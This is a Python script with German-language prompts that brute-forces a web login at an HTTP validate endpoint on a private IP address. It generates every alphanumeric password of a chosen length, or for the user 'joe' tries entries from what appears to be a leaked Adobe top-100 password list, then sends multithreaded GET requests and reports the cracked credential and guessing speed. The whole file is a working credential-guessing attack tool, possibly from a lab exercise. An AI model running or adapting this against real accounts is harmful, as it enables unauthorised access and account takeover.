
import itertools
import requests
from multiprocessing.dummy import Pool as ThreadPool
import time
pool_size = int(input('Pool-Größe: '))
pool = ThreadPool(pool_size)
user_input = input('Nutzername: ')
combination_array = []
session = requests.Session()
combined = []


def create_ingredients():
    password_ingredients = ''

    for x in range(10):
        password_ingredients += str(x)

    for i in range(ord('a'), ord('z')+1):
        password_ingredients += chr(i)

    for j in range(ord('A'), ord('Z')+1):
        password_ingredients += chr(j)

    return password_ingredients


def create_password(ingredients, length):
    combinations = []
    combinations += itertools.product(ingredients, repeat=length)
    print('Anzahl der Kombinationen: ' + str(len(combinations)))
    return combinations


def combine_profil(user_list, combination_list):
    for i in range(len(user_list)):
        for j in range(len(combination_list)):
            combined.append('Profil ' + user_list[i] +' ' + str(j) + ' : ' + ''.join(combination_list[j]))
            print(''.join(combination_list[j]))

    #with open('combination_list.txt', 'w') as filehandle:
        #for listitem in combined:
            #filehandle.write('%s\n' % listitem)


url = 'http://172.50.1.5:8080/validate?'

test_key_counter = []


def execute_hack(x):
    combinations = combination_array
    global test_key_counter
    if user_input == 'joe':
        local_url = url + 'benutzername=' + user_input + '&passwort=' + passwords[x]
        r = session.get(local_url)
        test_key_counter.append('k')
        if r.text != 'Benutzername oder Passwort falsch!':
            print('Versuchsnummer: ' + str(x))
            print(user_input + ' ' + passwords[x])
            print(r.text)
            elapsed_time = time.time() - start_time
            print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
            print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
            print('Getestete Keys: ' + str(len(test_key_counter)))
            raise SystemExit(0)

    else:

        local_url = url + 'benutzername=' + user_input + '&passwort=' + ''.join(combinations[x])
        r = session.get(local_url)
        test_key_counter.append('k')
        if r.text != 'Benutzername oder Passwort falsch!':
            print('Versuchsnummer: ' + str(x))
            print(user_input + ' ' + ''.join(combinations[x]))
            print(r.text)
            elapsed_time = time.time() - start_time
            print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
            print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
            print('Getestete Keys pro Sekunde: ' + str(x / elapsed_time))
            print('Getestete Keys: ' + str(len(test_key_counter)))
            raise SystemExit(0)



if user_input != 'joe':
    password_length = int(input('Wie lang soll das Passwort sein? '))
    print('Ingredients: ' + create_ingredients())
    combination_array = create_password(create_ingredients(), password_length)
    #preparefortext = []
    #for i in range(len(combination_array)):
     #   preparefortext.append(''.join(combination_array[i]))

    #with open('combinations.txt', 'w') as filehandle:
     #   for listitem in preparefortext:
      #      filehandle.write(listitem + ',')
    #combine_profil(user_array, combination_array)


passwords = []
f = open('adobe-top100.txt', 'r')
for line in f:
    line = line.strip()
    columns = line.split()
    passwords.append(columns[3])

f.close()
start_time = time.time()

if user_input == 'joe':
    range_iteration = range(len(passwords))
else:
    range_iteration = range(len(combination_array))

results_for = pool.map(execute_hack, range_iteration)

pool.close()
pool.join()
